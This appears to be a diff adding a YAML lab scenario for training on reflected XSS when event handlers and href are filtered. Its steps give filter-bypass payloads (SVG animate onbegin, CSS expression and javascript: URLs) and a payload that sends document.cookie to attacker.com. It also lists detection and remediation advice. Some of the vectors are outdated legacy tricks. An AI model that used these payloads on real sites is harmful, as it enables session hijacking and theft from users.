@@ -1,0 +1,94 @@
+# Category: Cross-Site Scripting (XSS)
+name: "Reflected XSS with event handlers and href attributes blocked"
+id: "xss-reflected-events-href-blocked-001"
+category: "xss"
+subcategory: "reflected"
+difficulty: "expert"
+estimated_time: "60 minutes"
+
+description: |
+  This scenario covers reflected XSS where both event handlers (e.g., onerror,
+  onload) and href attributes are blocked. The attacker must find alternative
+  ways to trigger JavaScript, such as using `<svg>` tags with `animate` or
+  using `<style>` tags with `background-image: url(javascript:...)`.
+
+learning_objectives:
+  - Understand blocking of event handlers and href
+  - Find alternative XSS vectors (SVG, CSS, media)
+  - Use `<svg>` and `<animate>` to trigger events
+  - Use CSS to execute JavaScript (e.g., `expression`, `behavior`)
+
+tools:
+  - Burp Suite
+  - Browser developer tools
+
+prerequisites:
+  - Advanced understanding of HTML/CSS/JS
+  - Access to a vulnerable web application or lab
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Test blocked attributes and elements"
+    commands:
+      - "# Send payloads with event handlers: <img src=x onerror=alert('XSS')>"
+      - "# Send payloads with href: <a href='javascript:alert(\"XSS\")'>"
+      - "# Observe what is removed or sanitized"
+    expected_output: "Event handlers and href are blocked"
+    detection: "None"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Use alternative vectors like SVG or CSS"
+    commands:
+      - "# SVG with animate: <svg><animate onbegin=alert('XSS') attributeName=x dur=1s>"
+      - "# CSS expression (IE only): <div style='width:expression(alert(\"XSS\"))'>"
+      - "# CSS background: <style>body{background:url('javascript:alert(\"XSS\")')}</style>"
+    expected_output: "JavaScript alert executes"
+    detection: "Web server logs may show payload"
+
+  - id: "step3"
+    phase: "post_exploitation"
+    action: "Exfiltrate data"
+    commands:
+      - "# Payload: <svg><animate onbegin='fetch(\"http://attacker.com/steal?cookie=\"+document.cookie)' attributeName=x dur=1s>"
+    expected_output: "Cookie sent to attacker"
+    detection: "Attacker server logs"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1189"
+    description: "Drive-by Compromise"
+  - standard: "OWASP"
+    control: "A03:2021"
+    description: "Injection"
+
+detection:
+  network_indicators:
+    - "Requests with SVG, CSS, or other alternative payloads"
+  log_indicators:
+    - "Web server logs with unusual parameters"
+  endpoint_indicators:
+    - "None"
+
+remediation:
+  immediate:
+    - "Use a strict allowlist of allowed tags and attributes"
+    - "Sanitize input with a robust library like DOMPurify"
+  long_term:
+    - "Implement a Content Security Policy"
+    - "Use context-aware output encoding"
+
+variables:
+  target_url: "http://example.com/page?param=PAYLOAD"
+
+assessment_questions:
+  - "What are alternative XSS vectors when event handlers are blocked?"
+  - "How can SVG be used for XSS?"
+  - "What is the CSS `expression` and why is it dangerous?"
+
+references:
+  - url: "https://owasp.org/www-community/attacks/xss/"
+    title: "OWASP XSS"
+  - url: "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html"
+    title: "XSS Filter Evasion"
